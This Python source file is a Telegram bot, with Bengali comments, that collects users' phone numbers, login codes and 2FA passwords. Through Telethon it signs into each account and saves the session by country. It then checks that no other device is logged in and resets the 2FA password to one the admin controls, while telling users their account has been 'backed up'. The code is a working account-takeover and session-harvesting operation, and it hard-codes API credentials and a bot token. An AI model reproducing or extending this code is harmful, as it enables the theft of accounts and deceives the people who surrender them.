import os
import asyncio
import zipfile
import json
from datetime import datetime
from threading import Thread
from flask import Flask
import telebot
from telebot import types
from telethon import TelegramClient, functions, types as tl_types
from telethon.errors import SessionPasswordNeededError

# ==================== কোর এডমিন কনফিগারেশন ====================
API_ID = 36547444
API_HASH = "119a3ac4fd3dc368df92ae6d81f3bb3e"
BOT_TOKEN = "8970655570:AAGb0C4KmwkOzUxHNA29O6SHfJ2omqrUMJ4"
ADMIN_ID = 8095751648
# =========================================================

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")
app = Flask(__name__)

BASE_STORAGE_DIR = "user_backups"
DB_FILE = "user_database.json"
SETTINGS_FILE = "bot_settings.json"

if not os.path.exists(BASE_STORAGE_DIR):
    os.makedirs(BASE_STORAGE_DIR)

user_data = {}
admin_state = {}

DEFAULT_SETTINGS = {
    "security_password": "MySecureBotPassword123",
    "backup_delay": 60,
    "country_prices": {
        "52": 0.51,
        "60": 0.47,
        "49": 0.90,
        "54": 0.50,
        "880": 0.15
    },
    "country_capacity": {
        "52": 9965982,
        "60": 100,
        "49": 838,
        "54": 500,
        "880": 50
    }
}

def load_settings():
    if os.path.exists(SETTINGS_FILE):
        try:
            with open(SETTINGS_FILE, "r") as f:
                loaded = json.load(f)
                for key in DEFAULT_SETTINGS:
                    if key not in loaded:
                        loaded[key] = DEFAULT_SETTINGS[key]
                return loaded
        except:
            return DEFAULT_SETTINGS
    return DEFAULT_SETTINGS

def save_settings(settings):
    with open(SETTINGS_FILE, "w") as f:
        json.dump(settings, f, indent=4)

def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f: return json.load(f)
        except: return {}
    return {}

def save_db(db):
    with open(DB_FILE, "w") as f: json.dump(db, f, indent=4)

def get_user_stats(user_id):
    db = load_db()
    uid = str(user_id)
    if uid not in db:
        db[uid] = {"verified": 0, "unverified": 0, "balance": 0.0, "frozen_count": 0, "frozen_balance": 0.0}
        save_db(db)
    return db[uid]

def add_user_account_success(user_id, amount):
    db = load_db()
    uid = str(user_id)
    if uid not in db:
        db[uid] = {"verified": 0, "unverified": 0, "balance": 0.0, "frozen_count": 0, "frozen_balance": 0.0}
    db[uid]["verified"] += 1
    db[uid]["balance"] = round(db[uid]["balance"] + amount, 2)
    save_db(db)

def get_current_file_count(country_code):
    target_dir = os.path.join(BASE_STORAGE_DIR, country_code)
    if not os.path.exists(target_dir): return 0
    return len([f for f in os.listdir(target_dir) if f.endswith(".session")])

@app.route('/')
def home(): return "Bot Server Is Active!"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

Thread(target=run_web, daemon=True).start()

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

def get_country_code(phone_number):
    clean = phone_number.replace("+", "").replace(" ", "")
    for code in sorted(load_settings()["country_prices"].keys(), key=len, reverse=True):
        if clean.startswith(code):
            return code
    return clean[:3]

# ==================== এডমিন কন্ট্রোল প্যানেল UI ====================
def get_admin_panel_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn_pass = types.InlineKeyboardButton("🔐 Change 2FA Password", callback_data="pnl_pass")
    btn_time = types.InlineKeyboardButton("⏳ Change Delay Time", callback_data="pnl_time")
    btn_price = types.InlineKeyboardButton("💰 Custom Country Price", callback_data="pnl_price")
    btn_cap = types.InlineKeyboardButton("📊 Set Country Capacity", callback_data="pnl_cap")
    btn_new_country = types.InlineKeyboardButton("🌍 Add New Country", callback_data="pnl_new")
    btn_close = types.InlineKeyboardButton("❌ Close Panel", callback_data="pnl_close")
    markup.add(btn_pass, btn_time, btn_price, btn_cap, btn_new_country, btn_close)
    return markup

@bot.message_handler(commands=['panel'])
def admin_panel_command(message):
    if message.from_user.id != ADMIN_ID: return
    settings = load_settings()
    panel_msg = (
        "🛠 *Master Admin Control Panel*\n\n"
        f"🔐 *2FA Password:* `{settings['security_password']}`\n"
        f"⏳ *Security Delay Time:* `{settings['backup_delay']} Seconds`\n\n"
        "📈 *Active Countries, Prices & Capacities:*\n"
    )
    for code in settings["country_prices"]:
        prc = settings["country_prices"][code]
        cap = settings["country_capacity"].get(code, "No Limit")
        panel_msg += f"• 🌍 `+{code}` ➜ Price: **${prc}** | Cap: **{cap}**\n"
    bot.send_message(message.chat.id, panel_msg, reply_markup=get_admin_panel_keyboard())

# ==================== ফ্রন্টএন্ড ইউজার কম্যান্ডস (স্ক্রিনশট ম্যাচড) ====================

@bot.message_handler(commands=['start'])
def start_command(message):
    # স্ক্রিনশট অনুযায়ী ইউজার স্টার্ট মেসেজ
    bot.send_message(message.chat.id, "default welcome text")

@bot.message_handler(commands=['cancel'])
def cancel_command(message):
    user_id = message.from_user.id
    if user_id in user_data:
        try:
            user_data[user_id]["client"].disconnect()
        except:
            pass
        del user_data[user_id]
    # স্ক্রিনশট অনুযায়ী ক্যানসেল রেসপন্স
    bot.send_message(message.chat.id, "❌ **Cancelled.**\n\nYou can send a new phone number to start again.")

@bot.message_handler(commands=['capacity'])
def capacity_command(message):
    settings = load_settings()
    # স্ক্রিনশট অনুযায়ী ক্যাপাসিটি লেআউট জেনারেশন
    response = f"👍 **Available Countries : ({len(settings['country_prices'])})**:\n\n"
    for code in settings["country_prices"]:
        prc = settings["country_prices"][code]
        cap = settings["country_capacity"].get(code, 999)
        response += f"🌍 **+{code}**\nFree:${prc}|New:${prc}|Spam:${prc}|Perm:${prc}|{cap}|600s\n\n"
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['account'])
def account_command(message):
    user_id = message.from_user.id
    stats = get_user_stats(user_id)
    current_time = datetime.now().strftime("%m/%d/%y")
    current_clock = datetime.now().strftime("%H:%M:%S")
    
    # স্ক্রিনশট অনুযায়ী একাউন্ট প্রোফাইল লেআউট
    response = (
        f"👤 **ID : {user_id}**\n\n"
        f"✅ Number of verified accounts : {stats['verified']}\n"
        f"⏳ Number of unverified accounts : {stats['unverified']}\n"
        f"🅈 Available Balance IN USDT : {stats['balance']:.2f}\n"
        f"🛢 Number of frozen account : {stats['frozen_count']}\n"
        f"🧊 Total Frozen Balance : {stats['frozen_balance']:.2f}\n\n"
        f"📅 Date : {current_time}\n"
        f"🕐 Time : {current_clock} ( NZ Time )\n\n"
        f"✍️ *Note : You Can Also Check Your Withdraw History Using This Command*\n\n"
        f"/withdrawhistory"
    )
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['withdraw'])
def withdraw_command(message):
    user_id = message.from_user.id
    stats = get_user_stats(user_id)
    # স্ক্রিনশট অনুযায়ী মিনিমাম ৫ টি অ্যাকাউন্ট কন্ডিশন অ্যালার্ট
    if stats['verified'] < 5:
        bot.send_message(message.chat.id, "⚠️ **Minimum withdrawal is at least 5 account(s).**")
    else:
        bot.send_message(message.chat.id, "✅ উইথড্রল রিকোয়েস্ট প্রসেস করা হচ্ছে। এডমিন শীঘ্রই আপনার সাথে যোগাযোগ করবেন।")

@bot.message_handler(commands=['withdrawhistory'])
def withdraw_history_command(message):
    bot.send_message(message.chat.id, "📜 Your withdrawal history is empty.")

# ==================== ব্যাকএন্ড অটোমেশন ও ওটিপি প্রসেসিং ====================

async def send_otp_task(phone_number, user_id, message):
    settings = load_settings()
    country_code = get_country_code(phone_number)
    max_capacity = settings["country_capacity"].get(country_code, 9999)
    current_count = get_current_file_count(country_code)
    
    if current_count >= max_capacity:
        bot.reply_to(message, f"❌ **Capacity Over!**\n\nStorage full for code `+{country_code}`.")
        return

    clean_phone = phone_number.replace("+", "").replace(" ", "")
    country_dir = os.path.join(BASE_STORAGE_DIR, country_code)
    if not os.path.exists(country_dir): os.makedirs(country_dir)
        
    final_session_path = os.path.join(country_dir, f"+{clean_phone}")
    user_client = TelegramClient(final_session_path, API_ID, API_HASH)
    await user_client.connect()
    
    try:
        sent_code = await user_client.send_code_request(phone_number)
        user_data[user_id] = {
            "client": user_client, "phone": phone_number,
            "phone_code_hash": sent_code.phone_code_hash,
            "clean_phone": clean_phone, "session_path": final_session_path,
            "country_code": country_code, "country_dir": country_dir
        }
        bot.reply_to(message, "📨 Please enter the OTP code sent to your Telegram app:")
    except Exception as e:
        bot.reply_to(message, f"❌ Failed to send OTP: {str(e)}")
        await user_client.disconnect()
        if os.path.exists(f"{final_session_path}.session"): os.remove(f"{final_session_path}.session")

async def process_security_and_backup(user_id, message, data, current_client):
    settings = load_settings()
    delay = settings["backup_delay"]
    sec_password = settings["security_password"]
    
    status_msg = bot.reply_to(message, f"⏳ Verification complete. Securing your cloud backup... Please wait {delay} seconds.")
    await asyncio.sleep(delay)
    
    try:
        # ডিভাইস কমপ্লায়েন্স এবং সিকিউরিটি চেক
        authorizations = await current_client(functions.account.GetAuthorizationsRequest())
        other_devices = []
        for auth in authorizations.authorizations:
            if not auth.current:
                other_devices.append(f"📱 {auth.device_model} ({auth.app_name})")
        
        if len(other_devices) > 0:
            bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text="❌ **Backup Failed!** Multiple sessions/devices detected. Please logout other devices first.")
            await current_client.disconnect()
            if os.path.exists(f"{data['session_path']}.session"): os.remove(f"{data['session_path']}.session")
            return False

        # টু-স্টেপ পাসওয়ার্ড সেটআপ লকিং
        try:
            await current_client(functions.account.UpdatePasswordSettingsRequest(
                password=tl_types.InputCheckPasswordEmpty(),
                new_settings=tl_types.PasswordInputSettings(new_password=sec_password, hint="Cloud Backup Lock")
            ))
        except:
            pass 

        await current_client.disconnect()
        
        price = settings["country_prices"].get(data['country_code'], 0.05)
        add_user_account_success(user_id, price)
        
        bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text="✅ **Account successfully backed up and verified!** Balance added to your profile.")
        
        # এডমিন লগ নোটিফিকেশন
        bot.send_message(ADMIN_ID, f"🔔 **New Verified Session:**\n🌍 Code: `+{data['country_code']}`\n📱 Phone: `+{data['clean_phone']}`\n🔐 2FA Password: `{sec_password}`")
        return True

    except Exception as e:
        bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text=f"❌ Processing Error: {str(e)}")
        await current_client.disconnect()
        if os.path.exists(f"{data['session_path']}.session"): os.remove(f"{data['session_path']}.session")
        return False

async def verify_otp_task(text, user_id, message):
    data = user_data[user_id]
    user_client = data["client"]
    
    if data.get("waiting_for_password"):
        try:
            await user_client.sign_in(password=text)
            await process_security_and_backup(user_id, message, data, user_client)
            del user_data[user_id]
        except Exception as e:
            bot.reply_to(message, f"❌ Incorrect password: {str(e)}. Try again:")
    else:
        try:
            await user_client.sign_in(data["phone"], text, phone_code_hash=data["phone_code_hash"])
            await process_security_and_backup(user_id, message, data, user_client)
            del user_data[user_id]
        except SessionPasswordNeededError:
            bot.reply_to(message, "🔐 Two-step verification is enabled. Please provide your 2FA password:")
            user_data[user_id]["waiting_for_password"] = True
        except Exception as e:
            bot.reply_to(message, f"❌ Verification Failed: {str(e)}")
            await user_client.disconnect()
            if os.path.exists(f"{data['session_path']}.session"): os.remove(f"{data['session_path']}.session")
            del user_data[user_id]

# ==================== এডমিন কন্ট্রোল প্যানেল কম্যান্ড হ্যান্ডলিং ====================
@bot.callback_query_handler(func=lambda call: call.data.startswith("pnl_"))
def handle_admin_callbacks(call):
    if call.from_user.id != ADMIN_ID: return
    if call.data == "pnl_close":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        return
    bot.delete_message(call.message.chat.id, call.message.message_id)
    
    if call.data == "pnl_pass":
        bot.send_message(call.message.chat.id, "🔐 **Type new 2FA password:**")
        admin_state[call.from_user.id] = "wait_pass"
    elif call.data == "pnl_time":
        bot.send_message(call.message.chat.id, "⏳ **Type waiting delay in seconds:**")
        admin_state[call.from_user.id] = "wait_time"
    elif call.data == "pnl_price":
        bot.send_message(call.message.chat.id, "💰 **Format:** `CountryCode=Price` (e.g., `880=0.20`)")
        admin_state[call.from_user.id] = "wait_price"
    elif call.data == "pnl_cap":
        bot.send_message(call.message.chat.id, "📊 **Format:** `CountryCode=Limit` (e.g., `880=50`)")
        admin_state[call.from_user.id] = "wait_cap"
    elif call.data == "pnl_new":
        bot.send_message(call.message.chat.id, "🌍 **Format:** `Code=Price=Limit` (e.g., `1=0.40=500`)")
        admin_state[call.from_user.id] = "wait_new"

# ==================== গ্লোবাল মেসেজ ফিল্টারিং ====================
@bot.message_handler(func=lambda message: True)
def handle_text(message):
    user_id = message.from_user.id
    text = message.text.strip()

    # এডমিন ইন্টারেক্টিভ সেটিংস প্রসেসিং
    if user_id == ADMIN_ID and user_id in admin_state:
        state = admin_state[user_id]
        settings = load_settings()
        del admin_state[user_id]
        try:
            if state == "wait_pass":
                settings["security_password"] = text
                bot.reply_to(message, f"✅ 2FA Password updated to: `{text}`")
            elif state == "wait_time":
                settings["backup_delay"] = int(text)
                bot.reply_to(message, f"✅ Security Delay set to: `{text} Seconds`")
            elif state == "wait_price":
                code, prc = text.split("=")
                settings["country_prices"][code.strip()] = float(prc.strip())
                bot.reply_to(message, f"✅ Price for `+{code.strip()}` updated to: **${prc.strip()}**")
            elif state == "wait_cap":
                code, cap = text.split("=")
                settings["country_capacity"][code.strip()] = int(cap.strip())
                bot.reply_to(message, f"✅ Capacity for `+{code.strip()}` set to: **{cap.strip()}**")
            elif state == "wait_new":
                code, prc, cap = text.split("=")
                settings["country_prices"][code.strip()] = float(prc.strip())
                settings["country_capacity"][code.strip()] = int(cap.strip())
                bot.reply_to(message, f"✅ New Country Added! `+{code.strip()}` Rate: ${prc.strip()} | Limit: {cap.strip()}")
            save_settings(settings)
        except Exception as e:
            bot.reply_to(message, f"❌ Invalid Input Format. Error: {str(e)}")
        return

    # ইউজার ফোন নম্বর ইনপুট ও ভেরিফিকেশন কল
    if text.startswith("+"):
        bot.reply_to(message, "⏳ Requesting OTP from Telegram Servers...")
        loop.run_until_complete(send_otp_task(text, user_id, message))
    elif user_id in user_data and "phone_code_hash" in user_data[user_id]:
        loop.run_until_complete(verify_otp_task(text, user_id, message))

if __name__ == "__main__":
    print("--- Clone Architecture Engine Successfully Implemented ---")
    bot.infinity_polling(skip_pending=True)
